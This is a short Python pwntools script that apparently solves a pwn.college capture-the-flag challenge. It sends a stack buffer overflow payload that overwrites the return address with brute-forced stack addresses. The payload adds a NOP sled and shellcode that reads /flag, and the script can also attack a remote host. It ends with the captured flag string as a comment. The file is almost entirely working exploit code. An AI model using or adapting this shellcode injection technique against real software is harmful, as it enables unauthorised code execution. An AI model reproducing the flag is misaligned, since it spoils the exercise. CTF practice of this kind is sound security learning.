#!/usr/bin/env python3
from pwn import *

context.terminal = ['kitty', '-e']

exe = context.binary = ELF('./binary-exploitation-hijack-to-shellcode', checksec=False)
libc = exe.libc

gdbscript = '''

'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            pause()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

stack_addr = 0x7fffffff0000
for i in range(100):
    p = start()

    payload = b'A' * (32 + 8)
    payload += p64(stack_addr)
    payload += asm('nop') * 0x950
    payload += asm(shellcraft.cat('/flag'))

    p.sendline(payload)
    time.sleep(0.5)
    output = p.recvall()
    print(output)
    print(hex(stack_addr))
    if (b'kms' in output):
        break

    stack_addr += 0x800

# pwn.college{ISGtjNobfpQYPUnG4uiTX1BETDL.dJjMzwCMxADNwEzW}